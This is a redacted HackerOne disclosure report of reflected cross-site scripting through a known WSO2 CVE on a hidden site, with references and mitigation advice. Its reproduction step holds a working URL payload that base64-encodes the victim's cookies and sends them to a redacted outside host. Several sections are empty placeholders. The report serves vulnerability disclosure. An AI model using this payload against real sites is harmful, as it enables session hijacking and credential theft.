# Reflected XSS at www.███████ at /██████████ via the ████████ parameter

## Metadata
- **Source:** HackerOne
- **Report:** 1173593 | https://hackerone.com/reports/1173593
- **Submitted:** 2021-04-24
- **Reporter:** z32
- **Program:** Unknown
- **Bounty:** Not disclosed
- **Severity:** medium
- **Vuln:** Cross-site Scripting (XSS) - Reflected
- **CVEs:** CVE-2017-14651
- **Category:** web-api

## Summary
**Description:**
The www.████████ site is using `████`, which is vulnerable to reflected XSS in the `/█████` component via the `█████████` parameter.

## References
https://www.cvedetails.com/cve/CVE-2017-14651/
https://docs.wso2.com/display/Security/Security+Advisory+WSO2-2017-0265

## Impact

An attacker can cause malicious code to execute in the victims browser, leading to credential theft, dri

## Attack scenario
*(see original)*

## Root cause
*(see original)*

## Attacker mindset
*(see original)*

## Defensive takeaways
*(see original)*

## Variant hunting
*(see original)*

## MITRE ATT&CK
*(see original)*

## Notes
*(see original)*

## Full report
<details><summary>Expand</summary>

**Description:**
The www.████████ site is using `████`, which is vulnerable to reflected XSS in the `/█████` component via the `█████████` parameter.

## References
https://www.cvedetails.com/cve/CVE-2017-14651/
https://docs.wso2.com/display/Security/Security+Advisory+WSO2-2017-0265

## Impact

An attacker can cause malicious code to execute in the victims browser, leading to credential theft, drive-by downloads, malicious redirects, and more.

## System Host(s)
www.██████████

## Affected Product(s) and Version(s)
████████

## CVE Numbers
CVE-2017-14651

## Steps to Reproduce
Browse to https://www.███████/███████?██████████=%3Cimg%20src=x%20onerror="a='http%3a%2f%2f███';b='%3Fcookie=';c=btoa(document.cookie);window.open(a%2bb%2bc)">

## Suggested Mitigation/Remediation Actions
Apply ███ (see references section)



</details>

---
*Analysed by Claude on 2026-05-24*
